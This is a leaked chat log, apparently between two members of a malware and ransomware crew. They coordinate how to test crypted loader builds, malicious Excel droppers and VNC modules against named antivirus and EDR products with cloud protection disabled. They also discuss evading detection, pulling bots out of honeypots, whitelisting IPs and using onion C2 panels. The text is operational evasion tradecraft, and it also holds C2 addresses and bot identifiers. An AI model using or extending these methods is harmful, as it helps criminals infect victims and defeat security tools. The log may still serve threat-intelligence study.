[11.08.21 15:33:16] collin: Hi!
[11.08.21 15:33:38] collin: did you test for Void BC - separately or in conjunction with Exel?
[11.08.21 15:39:49] angelo: hi
[11.08.21 15:39:51] angelo: in conjunction
[11.08.21 15:40:12] collin: who asked you to test with cloud?
[11.08.21 15:40:30] angelo: didn't understand the question
[11.08.21 15:40:54] collin: I wrote once - let me know when someone asks to test with cloud protection enabled
[11.08.21 15:41:19] angelo: shit
[11.08.21 15:41:26] collin: all tests of BC by default with cloud disabled
[11.08.21 15:41:29] collin: whose initiative?
[11.08.21 15:41:37] collin: BK+links with them
[11.08.21 15:41:58] angelo: Voyd always said to turn off defense and leave only sending examples
[11.08.21 15:42:09] angelo: Damn, it slipped my mind
[11.08.21 15:42:20] angelo: we're checking detects on xls
[11.08.21 15:42:20] collin: well, he and i solved this problem when he was talking about it?
[11.08.21 15:42:40] angelo: I can't say, but it was
[11.08.21 15:42:47] angelo: a week ago
[11.08.21 15:42:49] angelo: two
[11.08.21 15:43:00] angelo: it was by default always
[11.08.21 15:43:04] collin: ``
[24.05.2021 16:00:33] <kaktus> do you insist that the tests be done with the cloud?
[24.05.2021 16:00:46] <void> I do not insist
[24.05.2021 16:00:53] <void> I don't care at all
```
[11.08.21 15:43:14] collin: since the end of may - no cloud by default
[11.08.21 15:43:21] angelo: what the hell
[11.08.21 15:43:32] angelo: I don't touch the cloud at all
[11.08.21 15:43:38] angelo: I'm running xls
[11.08.21 15:43:45] collin: i.e. he gives you excel, but you don't even know what's in it?
[11.08.21 15:43:47] angelo: Why didn't you tell him?
[11.08.21 15:44:01] angelo: Yeah, I understand.
[11.08.21 15:44:13] angelo: we just focus on xls with him
[11.08.21 15:44:28] angelo: so it won't be detected
[11.08.21 15:44:37] angelo: now he's got xls detections
[11.08.21 15:44:51] angelo: for half a day he can't remove, I didn't even think about.........
[11.08.21 15:45:10] collin: I don't know, he writes that BK is bad)
[11.08.21 15:45:24] angelo: everything is bad
[11.08.21 15:45:31] angelo: my Excel is bad today
[11.08.21 15:45:41] angelo: before it was fine
[11.08.21 15:46:28] collin: ``

[11.08.21 15:46:41] collin: your report?
[11.08.21 15:46:49] angelo: yes, log from the car
[11.08.21 15:47:00] collin: was there only one detection, or one more - on excel or its components?
[11.08.21 15:47:31] angelo: now
[11.08.21 15:47:35] angelo: we looked at two
[11.08.21 15:47:52] collin: I mean on the same machine as the detector, was it the only one or was there something else
[11.08.21 15:48:03] angelo: one second
[11.08.21 15:52:11] angelo: no, that one
[11.08.21 15:52:37] angelo: but there's some weird shit
[11.08.21 15:52:43] angelo: Excel crashes itself
[11.08.21 15:53:06] angelo: never happened
[11.08.21 15:53:11] collin: that's what I understood, they change everything there every day, input function, etc.
[11.08.21 15:53:34] collin: let's do it this way in the future: when he gives you excel for a test - specify what load. If BC - test with cloud off and sending samples.
[11.08.21 15:53:54] collin: The fact that we test BK and BK without the cloud - it is agreed with everyone - with him, with Derek, with our seniors.
[11.08.21 15:54:18] angelo: I don't need to talk about sending images, it's like two times two. With the cloud, honestly, I don't even remember and I don't even remember now.
[11.08.21 15:54:38] angelo: SECOND
[11.08.21 15:54:42] angelo: again
[11.08.21 15:54:49] angelo: what do you mean by bundled and unbundled
[11.08.21 15:55:08] angelo: well there's xls
[11.08.21 15:55:11] collin: without is a separate BK exe or dll crypt file
[11.08.21 15:55:20] collin: xls is a bundle, it pulls and runs something
[11.08.21 15:55:33] angelo: we never test it without a bundle
[11.08.21 15:55:59] angelo: that means I always cut it off
[11.08.21 15:56:09] collin: yes
[11.08.21 15:56:36] collin: if you'll tell separately that you need cloud for BC - 1) write me about it 2) leave me a proper machine for such tests
[11.08.21 15:56:46] collin: i.e. a new one, with a clean ipy etc.
[11.08.21 15:57:32] angelo: so, I have only real-time and Tamper for test ?
[11.08.21 15:58:14] collin: yes
[11.08.21 15:58:20] angelo: got it
[11.08.21 16:03:38] angelo: okay
[11.08.21 16:03:38] angelo: voyd writes
[11.08.21 16:04:01] angelo: `so how to test without the cloud ? )`
[11.08.21 16:04:47] collin: Got it, I'll communicate with him
[11.08.21 16:04:55] collin: did you test xls on farms?
[11.08.21 16:04:58] collin: how often do you test there?
[11.08.21 16:05:10] angelo: we wanted to on the farm, but then voyd got quiet
[11.08.21 16:05:41] angelo: i mean, i didn't give you a test on the farms
[11.08.21 16:59:36] angelo: tell me.
[11.08.21 16:59:44] angelo: if i run hetinfo on the battle bot
[11.08.21 16:59:49] angelo: is it ok ?
[11.08.21 16:59:57] angelo: bot did not knock
[11.08.21 17:00:11] angelo: VM is new today
[11.08.21 17:01:40] angelo: can ?
[11.08.21 17:04:05] collin: on combat?
[11.08.21 17:04:12] angelo: well, i don't know
[11.08.21 17:04:15] angelo: There's a bot
[11.08.21 17:04:23] collin: For combat, go to derek
[11.08.21 17:04:23] angelo: I don't know, maybe it was a glitch
[11.08.21 17:04:34] angelo: my ip was not hit by a bot
[11.08.21 17:04:36] collin: maybe yours went down in hani?
[11.08.21 17:04:42] angelo: yeah, i looked it up
[11.08.21 17:06:09] angelo: no detects
[11.08.21 17:06:15] collin: there was some kind of floating problem with this build - manuel didn't knock on one machine
[11.08.21 17:06:29] angelo: shit
[11.08.21 17:06:30] collin: but we didn't find out what's wrong - logged normal, combat only didn't knock
[11.08.21 17:06:35] angelo: now
[11.08.21 17:06:38] angelo: on the second run
[11.08.21 17:06:43] collin: not exactly with this group and not today, couple of days ago - from this coder
[11.08.21 17:06:49] collin: some kind of floating error is possible
[11.08.21 17:07:45] angelo: let's try the second one
[11.08.21 17:07:47] angelo: just in case
[11.08.21 17:14:45] angelo: did you change admins ?
[11.08.21 17:15:51] collin: `https://lch5nnzyb5aof43pitcrzkmnvlr4xkrestpj4cpwstvgej34kqq6wqyd.onion/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/`
[11.08.21 17:15:53] collin: this one now
[11.08.21 17:16:04] collin: all others are no longer usable
[11.08.21 17:16:09] angelo: well
[11.08.21 17:16:11] angelo: as always
[11.08.21 17:16:13] collin: in the near future at least
[11.08.21 17:16:14] angelo: I don't know
[11.08.21 17:16:41] collin: try your account and password on it, those on https://bxbwa6... were
[11.08.21 17:17:10] collin: if it fails, I'll reset the password
[11.08.21 17:17:21] angelo: are you still there?
[11.08.21 17:17:23] angelo: 10 minutes
[11.08.21 17:17:26] angelo: busy
[11.08.21 17:18:00] collin: here,
[11.08.21 17:18:04] collin: Noblesse oblige)
[11.08.21 17:24:50] angelo: oh, Mi frenchie
[11.08.21 17:24:52] angelo: )
[11.08.21 17:25:20] collin: checked?
[11.08.21 17:26:49] angelo: sec.
[11.08.21 17:32:12] angelo: check in.
[11.08.21 17:33:06] collin: added group, check if there are bots
[11.08.21 17:33:35] collin: There's only one
[11.08.21 17:33:36] angelo: not yet
[11.08.21 17:33:40] angelo: adam needs something urgent
[11.08.21 17:33:56] collin: Well, re-login there.
[11.08.21 17:33:59] collin: I just added
[11.08.21 17:34:34] collin: 37.120.205.252 isn't yours?
[11.08.21 17:34:40] angelo: it's mine.
[11.08.21 17:35:02] collin: put it into test.
[11.08.21 17:35:07] angelo: ok
[12.08.21 14:34:54] angelo: hi.
[12.08.21 14:34:58] angelo: we're not knocking
[12.08.21 14:35:10] angelo: it's been four minutes
[12.08.21 14:35:47] angelo: ok
[12.08.21 14:35:49] angelo: knocked
[12.08.21 14:36:56] collin: banging time increased in all builds
[12.08.21 14:36:58] collin: hello!
[12.08.21 14:37:03] collin: up to 20 minutes
[12.08.21 14:37:08] collin: 10-15 minutes for this one.
[12.08.21 14:37:08] angelo: shit
[12.08.21 14:37:11] collin: it's the longest
[12.08.21 14:37:27] angelo: In always a fuss and look who's to blame)
[12.08.21 14:37:44] collin: bypassing the avs and the yedr - we're trying to do better)
[12.08.21 14:37:58] angelo: sure, all for the good
[13.08.21 09:20:42] angelo: Hi.
[13.08.21 09:20:48] angelo: things didn't go well with the guys yesterday
[13.08.21 09:20:50] angelo: detects
[08.13.21 09:20:54] angelo: honestly, I don't know
[13.08.21 09:24:40] collin: hi!
[13.08.21 09:25:07] collin: who said where in work or tests?
[13.08.21 09:26:01] angelo: at work
[13.08.21 09:26:06] angelo: tested without cloudy
[13.08.21 09:26:15] angelo: I think tenet can explain it better
[13.08.21 09:26:18] angelo: or Void
[13.08.21 09:26:28] collin: ok, waiting for information from them
[13.08.21 14:54:31] angelo: remind me again
[13.08.21 14:54:40] angelo: will eu ip give a shit ?
[13.08.21 14:54:44] angelo: will go to the junkies
[13.08.21 14:55:46] collin: hi!
[13.08.21 14:55:59] collin: some groups have filters, some don't
[13.08.21 14:56:21] collin: if you filter by country, you'll get the bot in the Honeypots
[13.08.21 14:56:38] collin: you can't work with it in hanypots, you can't set commands, it won't work, you have to move it to bots/test bots
[13.08.21 14:56:49] angelo: yeah, i always throw it into tests
[13.08.21 14:56:56] angelo: The main thing is that lithuania
[13.08.21 15:20:43] angelo: but here's the question, there is no way we can find out if the check or the same xls is detected without the cloud
[13.08.21 15:23:15] collin: you can test with the cloud
[13.08.21 15:23:24] collin: order separate crypt, prepare clean VM
[13.08.21 15:23:39] collin: but it won't be impressive on one VM
[13.08.21 15:23:57] collin: you need at least 3.
[13.08.21 15:24:29] collin: if they insist, let's do it
[13.08.21 15:24:34] collin: but VM must be clean, addresses clean
[13.08.21 15:24:44] collin: I gave you minimal requirements for the test machine
[13.08.21 15:24:52] angelo: yeah
[13.08.21 15:24:56] angelo: it's not easy
[08.13.21 15:25:02] angelo: it's not a test of course
[13.08.21 15:25:04] collin: that's what I'm talking about
[13.08.21 15:25:12] collin: it's not easy
[08.13.21 15:25:14] angelo: not reasonable
[13.08.21 15:25:18] collin: it's easier to do prog, collect status by taps
[13.08.21 15:25:31] collin: Derek said today - yesterday's build knocked out 0 out of 4
[13.08.21 15:25:38] collin: in such quantities, the stats are of course not indicative
[13.08.21 15:25:51] collin: well, they changed his build, from another coder
[13.08.21 15:26:00] angelo: I changed it yesterday
[13.08.21 15:26:07] angelo: give me another codec
[13.08.21 15:26:11] collin: the one with the latest data (2 days ago) - the slippage is up to 40%
[13.08.21 15:26:23] angelo: damn, it's hard
[13.08.21 15:26:29] angelo: in fact, the test is a working day
[13.08.21 15:26:30] collin: on the spam distribution is true
[13.08.21 15:26:37] collin: it's spotty, you need a different approach
[13.08.21 15:26:52] collin: he ordered solutions like check automation
[13.08.21 15:27:03] collin: for dll and xls on our farms, still waiting
[13.08.21 15:27:19] collin: they're working on the corp-machines - what will they get from the vindef test?
[13.08.21 15:27:25] angelo: yeah yeah yeah, hands are not serious
[13.08.21 15:27:35] collin: there's corp av and edr
[13.08.21 15:27:44] angelo: can we at the farm check ?
[13.08.21 15:27:52] collin: you have to use serious AV on farms
[13.08.21 15:27:56] angelo: yeah, max xls
[13.08.21 15:28:03] collin: on farms we can, but manually for now
[13.08.21 15:28:06] collin: also complicated and long
[13.08.21 15:28:32] angelo: yes, the test turns into a full-fledged job
[13.08.21 15:29:10] angelo: alright, if only my vm with AV were there, but here on a remote site it's hard
[13.08.21 15:29:20] collin: in May we solved this problem and decided - full-fledged tests are inexpedient, the tests on one machine with the cloud are unreasonable
[13.08.21 15:29:21] angelo: can i put it for myself ?
[13.08.21 15:29:35] angelo: make 5 machines
[08.13.21 15:29:40] angelo: 7
[13.08.21 15:29:41] angelo: with AV
[13.08.21 15:30:01] collin: you're going to test them manually
[13.08.21 15:30:13] collin: you can do it on AV farms too
[13.08.21 15:30:14] angelo: trust me, it's a lot faster than ours
[13.08.21 15:30:27] collin: some require a license
[13.08.21 15:30:32] collin: without them, once a month
[13.08.21 15:30:37] angelo: that's not easy...
[13.08.21 15:30:42] angelo: whatever
[13.08.21 15:30:51] angelo: i change cars very often
[13.08.21 15:31:08] collin: you don't know the right one, AV is not few of them
[13.08.21 15:31:23] collin: we originally had 4 key ones, then they say - Sofos Makafi, etc.
[13.08.21 15:31:37] collin: so from 5-7 cars it will come to 10, and then to 15...
[13.08.21 15:31:45] angelo: Avast
Sophos
Forti
McAfee
Eset
Trend Micro
BitDefender
Symantec
[13.08.21 15:31:51] angelo: at least them
[13.08.21 15:32:04] angelo: also nonsense
[08.13.21 15:32:06] angelo: sure
[13.08.21 15:32:16] angelo: automation is needed, how long to wait for it ?
[13.08.21 15:32:35] angelo: the admin didn't tell me anything specific
[13.08.21 15:32:55] collin: we have been waiting for three months, the last 1.5 they say it will be ready one day
[13.08.21 15:33:11] angelo: Damn, let Franz give a bonus
[13.08.21 15:33:12] collin: the admin who was doing it was overloaded with a bunch of other tasks
[13.08.21 15:33:13] angelo: God!
[13.08.21 15:33:19] angelo: 200-300 bucks extra
[13.08.21 15:33:27] angelo: if it goes up in a week
[13.08.21 15:33:30] angelo: Like kids, man
[13.08.21 15:33:30] collin: now they redistribute a little, elroy is engaged
[13.08.21 15:33:53] collin: he's taking it seriously - it shouldn't be like before
[13.08.21 15:33:54] angelo: there's a great need for the farm
[13.08.21 15:34:02] collin: he announced some terms - that's how you have to wait
[13.08.21 15:43:41] angelo: Elroy is a good guy
[13.08.21 19:07:39] collin: 196.240.54.36 is not your bot?
[13.08.21 19:18:48] angelo: um.
[13.08.21 19:18:49] angelo: is he online ?
[13.08.21 19:18:52] angelo: not mine
[13.08.21 19:18:57] angelo: no such ip
[13.08.21 19:19:11] angelo: the guys aren't working today by the way
[13.08.21 19:19:58] collin: everything bad with bk again?)
[13.08.21 19:20:07] angelo: no
[13.08.21 19:20:15] angelo: they are down
[13.08.21 19:20:26] angelo: proxies
[13.08.21 19:20:31] collin: they didn't warn us...
[13.08.21 19:21:04] collin: Though I'm used to it, it's often like this
[13.08.21 19:21:09] angelo: yeah
[13.08.21 19:21:13] angelo: I'm used to it.
[13.08.21 19:21:24] angelo: I'm rarely warned about anything at all
[13.08.21 19:21:30] angelo: thanks to my friendship with the admin
[13.08.21 19:22:00] collin: yesterday 9 different assemblies were ordered, 1 was canceled a bit later after ordering, as a result only 2 assemblies went to work, the rest - in vain did)
[13.08.21 19:22:17] collin: that's for different partners in total
[13.08.21 19:22:22] angelo: the main thing is to work
[13.08.21 19:22:26] angelo: why are you here?
[13.08.21 19:22:39] collin: I came here, I saw how bad everything is in the admin area
[13.08.21 19:22:53] angelo: Doesn't sound like you.)
[13.08.21 19:22:56] collin: filters broke, 40 good bots in hani fell, partner "very satisfied"
[13.08.21 19:23:04] angelo: i really didn't understand what admin said
[13.08.21 19:23:06] angelo: proxies
[13.08.21 19:23:15] angelo: who broke it ?
[13.08.21 19:23:26] collin: don't know nobody confessed)
[13.08.21 19:23:52] angelo: fell in the hanni - could not be pulled out already ?
[13.08.21 19:25:33] collin: came and took it out, partners didn't seem to get it right
[13.08.21 19:25:56] angelo: Shit
[13.08.21 19:25:56] angelo: wait
[13.08.21 19:26:00] angelo: ramon's?
[13.08.21 19:31:08] angelo: I don't see

[13.08.21 19:32:03] angelo: ah
[13.08.21 19:32:04] collin: another user
[13.08.21 19:32:08] angelo: shit
[13.08.21 19:32:11] angelo: that sucks.
[13.08.21 19:32:20] angelo: do they still work with uk?
[13.08.21 19:32:26] angelo: did they take everything from us?)
[13.08.21 19:32:43] angelo: Wherever I poke Zeus, he's using everything
[13.08.21 19:33:00] collin: and Leo BK got interested, he took it for test recently
[13.08.21 19:33:12] collin: we expand bit by bit
[13.08.21 19:33:17] angelo: yeah, I see
[13.08.21 19:33:20] angelo: Leo don't know
[13.08.21 19:33:27] angelo: I'm only half with Zeus
[13.08.21 19:33:31] angelo: and ramon by bk

[31.08.21 19:30:36] angelo: they start tomorrow ?
[31.08.21 19:30:44] collin: do you know if voyd is in external toad or where else?
[31.08.21 19:30:52] collin: Yes, they were planning to start tomorrow, but today they're testing
[31.08.21 19:30:55] angelo: too bad they didn't make farms for xls tests
[31.08.21 19:31:03] collin: but i left, i didn't wait for crypt and i'm not sure if they passed it on(
[31.08.21 19:31:05] angelo: no
[31.08.21 19:31:29] angelo: definitely not
[31.08.21 19:32:20] collin: I'll give you the link

[01.09.21 07:17:00] collin: hi!
[01.09.21 07:17:20] collin: ok, let's do it today
[01.09.21 07:18:25] angelo: today I'll have to test xls on farms by hand (
[01.09.21 11:08:47] angelo: Vode online
[01.09.21 11:09:54] collin: duplicate
[01.09.21 11:09:55] collin: hi
[01.09.21 11:10:03] angelo: Enter online
[02.09.21 10:16:58] angelo: hello again
[02.09.21 10:17:05] angelo: tell me in three words
[02.09.21 10:17:11] angelo: what's the difference between tric and bc
[02.09.21 10:17:18] angelo: if you didn't ask her
[02.09.21 10:17:22] angelo: yet
[02.09.21 10:17:28] angelo: when you have time
[02.09.21 10:17:56] collin: hi!
[02.09.21 10:18:42] collin: I don't know much about trick, only that it has additional functionality
[02.09.21 10:19:00] collin: you can't find it in tric: stilers and grapplers, something else maybe (I don't know)
[02.09.21 10:19:16] angelo: that is extended modules
[02.09.21 10:19:20] collin: I can tell you what's in BC
[02.09.21 10:19:26] collin: what's in the trike - ask Caesar
[02.09.21 10:19:27] angelo: i just don't get it, they are two different instruments
[02.09.21 10:19:28] collin: and compare
[02.09.21 10:19:42] angelo: or essentially the same thing
[02.09.21 10:19:43] angelo: ?
[02.09.21 10:20:16] collin: there is a common functionality and purpose of use: fixing, the first step of penetration
[02.09.21 10:20:16] angelo: the principle is the same, infection and loading of additional modules
[09.09.21 15:48:07] collin: hello!
[09.09.21 15:48:36] collin: how often does Void ask you to test excel in conjunction with cloud BC?
[09.09.21 15:48:41] collin: when was the last time?
[09.09.21 16:26:05] angelo: there were no tests for two days
[09.09.21 16:26:12] angelo: used to be every day
[09.09.21 16:26:17] angelo: I don't know what's wrong
[09.09.21 16:26:19] angelo: why ?
[09.09.21 16:26:22] angelo: what is the problem ?
[09.09.21 16:26:34] angelo: aah
[09.09.21 16:26:40] angelo: sorry, there were no tests at all on the cloud
[09.09.21 16:27:22] angelo: after that case - didn't test cloud for pc anymore
[10.09.21 12:48:57] collin: hi!
[10.09.21 12:49:00] collin: ``.
More on BK. Yesterday angelo tested on our farm a dll build that was made for netwalker. Everything is clean except sumantik and trendmicro. Trend micro detects after startup from sumantec - after opening the archive.
```
[10.09.21 12:49:06] collin: did you test the source or a crypt?
[10.09.21 12:49:57] angelo: tested what I was given
[10.09.21 12:50:02] angelo: krypt
[10.09.21 12:50:04] angelo: think
[10.09.21 12:50:06] angelo: from elroy
[10.09.21 12:50:24] angelo: crypt crypt, stupid
[10.09.21 12:51:25] angelo: just haven't tested it on bitdefender
[10.09.21 12:51:40] angelo: there was a problem with it on VM, license expired
[10.09.21 12:56:10] collin: ok
[22.10.21 11:05:23] angelo: can you explain
[22.10.21 11:05:25] angelo: hi
[26.10.21 08:59:12] angelo: hi
[26.10.21 09:22:13] collin: hi!
[26.10.21 09:25:04] angelo: tell me
[26.10.21 09:25:20] angelo: do we have autotests for dlls ?
[26.10.21 09:25:38] angelo: I need to test one dll, you should know how I don't want to do it by hand
[26.10.21 09:25:57] angelo: let me guess, does elroy.)
[26.10.21 09:26:06] angelo: he already is.
[26.10.21 09:26:44] angelo: got it, man, it's so fucking convenient!
[26.10.21 09:26:55] angelo: it took me 6 hours to go through everything
[26.10.21 09:27:14] angelo: nothing about xls/doc
[27.10.21 08:01:50] angelo: hi !
[27.10.21 08:02:04] angelo: 1)
[27.10.21 08:02:08] angelo: yesterday derek was waiting for the assembly
[27.10.21 08:08:18] angelo: we gave him the 5th, 10 and 12 were of no use
[27.10.21 13:26:17] angelo: me again
[27.10.21 13:27:38] angelo: I was here with VM farm
[27.10.21 13:27:43] angelo: tell me if I can check it with cloud ?
[27.10.21 13:27:47] angelo: build
[27.10.21 13:27:56] angelo: put it till tonight without load
[27.10.21 13:28:57] angelo: some kind of zev's, but it was 39
[27.10.21 13:29:12] angelo: separately
[27.10.21 13:29:30] angelo: without load and without stitching into anything
[27.10.21 13:32:34] angelo: put clean machines, did not touch, only updated
[27.10.21 13:33:27] angelo: 39 group where do I get it? sorry for distracting me a million times =(
[27.10.21 13:35:27] angelo: thanks a lot
[02.11.21 09:46:08] collin: hi!
[02.11.21 09:46:23] angelo: hi !

[02.11.21 09:48:58] angelo: was yes
[02.11.21 09:49:23] angelo: two questions
[02.11.21 09:49:30] angelo: where to get the assembly and where to get the load
[02.11.21 09:57:13] angelo: ok
[02.11.21 10:18:14] angelo: tell me about the bot https://x6rciduomtjt25xigz7onkgxmusuwwuxqvidjkcramwg3lb5vvpsm7ad.onion/dAkEAkFKkzm8QTA3vk1zyS50ArYk8y4le4HtJ6UaWHtus/index.php?r=bots/command&id=629b52302cb26fed0322466088d51983
[02.11.21 10:18:23] angelo: is this today's build ?
[02.11.21 10:19:21] angelo: how to understand this point
[02.11.21 10:40:52] angelo: about VNTs the situation is not clear
[02.11.21 10:41:10] angelo: I want to check the VNC dll running on the crypto
[02.11.21 10:42:14] angelo: yes
[02.11.21 10:42:31] angelo: dl2_x64_19_449.dll
dl2_x64_39_450.dll
[02.11.21 10:42:33] angelo: yes I did
[02.11.21 10:42:45] angelo: and on both run vnts yes ?
[02.11.21 10:43:10] angelo: well, he sent me the source code, now I'll brother scripts from the panel
[09.11.21 09:16:22] angelo: Elroy said yesterday
[09.11.21 09:16:30] angelo: you know who would do the script for Sowos
[09.11.21 09:16:35] angelo: Sophos
[09.11.21 09:16:43] angelo: someone who did for Webroot
[09.11.21 09:16:55] angelo: ask the guy when you have time ?
[09.11.21 09:46:18] angelo: question
[09.11.21 09:46:31] angelo: caesar needs to understand why the trick dies after starting with the uk
[09.11.21 09:46:35] angelo: he needs
[09.11.21 09:46:50] angelo: `demanded to explain and throw down the code how it's run, haven't thrown it down yet
[09.11.21 09:51:38] angelo: and a question about BC
[09.11.21 09:51:52] angelo: yesterday after shel died bots BK
[09.11.21 09:52:09] angelo: now I will let a couple more bots on VM for the test and I will report more accurately
[09.11.21 09:58:52] angelo: not me exactly )
[09.11.21 09:58:54] angelo: well, only dead ones
[09.11.21 09:59:24] angelo: in tests
[09.11.21 09:59:24] angelo: 1581690cc677a233cee75273fd7f725f
[09.11.21 09:59:37] angelo: 6366bd40699ce678a9763b653009be3a
[09.11.21 10:02:15] angelo: after overloading machine died
[09.11.21 10:02:28] angelo: no
[09.11.21 10:02:31] angelo: the bots worked
[09.11.21 10:02:37] angelo: knocked on the tricks
[09.11.21 10:02:48] angelo: and after overloading the machines, all the bots died
[09.11.21 10:03:18] angelo: didn't seem to wake up
[09.11.21 10:03:36] angelo: yes, the shell without the overload, and why overloading was needed...
[09.11.21 10:04:00] angelo: tell me, why do we watch shellcode at all?
[09.11.21 10:04:10] angelo: zeus launches trik with a simple dll
[09.11.21 10:06:31] angelo: originally there are problems with the dll
[09.11.21 10:06:56] angelo: oh ho ho
[09.11.21 10:07:10] angelo: and shell ?
[09.11.21 10:31:44] angelo: BK come alive ok
[09.11.21 10:31:49] angelo: started yesterday's cars
[09.11.21 10:31:53] angelo: after shell
[09.11.21 10:31:55] angelo: no problems
[09.11.21 10:33:43] angelo: and here we go back to my question about shell
[09.11.21 10:34:04] angelo: why to look through shellcode, if the problem with running dll isn't solved
[09.11.21 10:34:14] angelo: from uk to tric
[09.11.21 10:34:41] angelo: they have bk bots alive and trik bots dead, the same bots
[09.11.21 10:36:06] angelo: yeah
[09.11.21 10:36:14] angelo: no
[09.11.21 10:36:26] angelo: I'll talk to you again
[09.11.21 10:38:04] angelo: no
[09.11.21 10:38:35] angelo: I'm going to run the shell again and leave the trike bot to work
[09.11.21 12:12:16] angelo: ok
[09.11.21 12:12:17] angelo: thanks
[09.11.21 12:13:56] angelo: and it gives out ?
[09.11.21 12:13:56] angelo: who usually crypts it out ?
[09.11.21 14:36:34] angelo: so
[09.11.21 14:36:42] angelo: there's adam's confusion
[09.11.21 14:36:55] angelo: 19 can also march ?
[09.11.21 14:36:59] angelo: you said
[09.11.21 14:39:08] angelo: yeah, that's right
[09.11.21 14:39:09] angelo: thanks.

[09.11.21 15:30:03] angelo: why fails ?
[09.11.21 15:32:19] angelo: who the hell started at 11
[09.11.21 15:32:23] angelo: wasn't paying attention
[09.11.21 15:33:18] angelo: I got it, I just figured out who did it
[09.11.21 15:33:24] angelo: me)
[09.11.21 15:33:29] angelo: shit
[09.11.21 15:34:24] angelo: shit

[09.11.21 15:53:40] angelo: give me advice
[09.11.21 15:56:25] angelo: at least how to explain
[09.11.21 15:56:29] angelo: you just mixed up the bot ?
[09.11.21 15:56:33] angelo: that's pretty dumb
[09.11.21 15:56:43] angelo: but you better write it yourself ?
[09.11.21 16:00:48] angelo: we should learn to clean up after ourselves]

[22.11.21 10:59:40] angelo: said that in any bot the SHK did not work
[22.11.21 11:03:52] angelo: so, as I understand there is nothing to do on these bots
[22.11.21 11:03:54] angelo: that makes sense
[22.11.21 11:04:00] angelo: only in new builds ?
[22.11.21 11:04:19] angelo: I was just checking just in case
[22.11.21 11:06:02] angelo: [03:05:12] <cherry> why not upgrade
[03:05:17] <cherry> just dll all bots?
[03:05:23] <cherry> which are already there?
[22.11.21 11:06:10] angelo: how better to answer ?
[22.11.21 11:07:34] angelo: okay thanks
[11/23/11/21 11:58:30] collin: hi!
[23.11.21 11:59:07] angelo: hi !
[23.11.21 11:59:58] angelo: hmm
[23.11.21 12:00:00] angelo: paid ?
[11/23/11/21 12:35:17] angelo: now
[23.11.21 12:35:23] angelo: a moment
[23.11.21 12:37:55] angelo: come on
[23.11.21 12:41:15] angelo: check
[23.11.21 12:44:26] angelo: Oh it worked!
[23.11.21 12:44:32] angelo: thanks a lot !
[29.11.21 08:59:53] angelo: hi !
[29.11.21 09:00:32] collin: hi !
[29.11.21 09:00:50] angelo: Graham threw the assembly of VNC
[29.11.21 09:00:52] angelo: We have to check it out.
[29.11.21 09:01:21] angelo: I'd like to test bot
[29.11.21 09:01:40] collin: vnts combat new or test?
[29.11.21 09:01:42] collin: he didn't send me
[29.11.21 09:01:56] angelo: He did it on Friday night
[29.11.21 09:02:00] angelo: do you want it?
[29.11.21 09:02:27] collin: come on
[29.11.21 09:02:35] angelo: we couldn't run the vntz version that was on the panel, no way it worked
[29.11.21 09:03:45] angelo: https://privnote.com/acYDLgWu#HHBpdvLVk
[29.11.21 09:04:09] angelo: https://file.io/S1IoM8Y5r3Ok
[29.11.21 09:04:53] angelo: there are 2 main changes:
port transfer with pad list
and running via regsvr32 with parameters
Also removed check to get the ip of the first network interface, maybe in it, but the signatures have changed a little, may live for a long time
[29.11.21 09:08:21] collin: any proclets relevant to vnts bridge?
[29.11.21 09:08:47] collin: I'll order the assembly
[29.11.21 09:10:04] angelo: sec
[29.11.21 09:10:56] angelo: 45.58.53.100

[29.11.21 09:11:28] collin: wait for BC build from Royal, it will be for start and crypto in exe
[29.11.21 09:11:53] collin: these procs all have standard port, you don't need to reassign on some?
[29.11.21 09:12:27] angelo: standard 9090
[29.11.21 09:13:02] angelo: adam sat on uk ?
[29.11.21 09:13:30] angelo: I thought he was our admin
[29.11.21 09:15:54] collin: what do you mean sat down?
[29.11.21 09:16:32] collin: he periodically does something with bots by partners' requests, he didn't say what exactly
[29.11.21 09:16:46] angelo: i got it, i thought he started working with bk
[29.11.21 09:17:06] angelo: as a partner
[29.11.21 09:27:05] collin: `and launch via regsvr32 with parameters` as he wrote - it would be difficult to do so on BC, via drop+start bat command only...
[29.11.21 09:30:12] angelo: I'm not good at this, so I only took vntz, and it was already 1 am
[29.11.21 10:08:25] angelo: tell me if you can run the module now?
[29.11.21 10:08:31] angelo: that's what I threw
[29.11.21 10:09:44] collin: on combat?
[29.11.21 10:09:56] collin: better check on the test one first, if it's not checked
[29.11.21 10:10:06] collin: old-style only rundll32
[29.11.21 10:10:24] angelo: got it, so the command is the same
[29.11.21 10:12:08] collin: What were the problems with it, the old version wouldn't run
[29.11.21 10:12:11] collin: or something else?
[29.11.21 10:12:21] angelo: the old one wouldn't start
[29.11.21 10:12:24] angelo: I don't understand why
[29.11.21 10:12:30] angelo: Wylde and I were torturing him
[29.11.21 10:12:47] collin: wasn't it tapping or did you write error/fail directly on the bots?
[29.11.21 10:12:58] angelo: no, it didn't start vntz
[29.11.21 10:13:09] angelo: the command worked
[29.11.21 10:29:38] angelo: and why in the status newbie bot writes that it is offline ?
[29.11.21 10:30:21] collin: where is it how?
[29.11.21 10:30:50] angelo: 185.176.222.56
[29.11.21 10:30:52] angelo: test
[29.11.21 10:31:18] collin: did you run it?
[29.11.21 10:31:23] collin: from royal's build?
[29.11.21 10:31:24] angelo: yes
[29.11.21 10:31:27] angelo: yes.
[29.11.21 10:31:33] collin: the id is wrong, something's wrong
[29.11.21 10:31:42] angelo: I'll tell him.
[29.11.21 10:32:08] collin: with such id's should go to junkies right away
[29.11.21 10:32:24] angelo: yes
[29.11.21 10:32:27] angelo: I put it into the test ones
[29.11.21 10:32:52] collin: maybe it's not yours?
[29.11.21 10:33:01] angelo: it's mine
[29.11.21 10:33:03] angelo: It's mine.
[29.11.21 10:33:06] angelo: no other
[29.11.21 10:36:21] collin: Judging by the log, bot didn't snitch, only the lowader
[29.11.21 10:36:22] collin: strange
[29.11.21 10:37:44] angelo: I'll run with logs
[29.11.21 10:37:57] collin: did you give me your IP for whitelisting?
[29.11.21 10:38:08] angelo: no
[29.11.21 10:38:11] angelo: new
[29.11.21 10:38:11] angelo: w
[29.11.21 10:38:21] angelo: 185.176.222.56
[29.11.21 10:38:24] collin: all right then, loeder sat in the janipots
[29.11.21 10:39:09] collin: added IP, try again
[29.11.21 10:39:18] angelo: ok
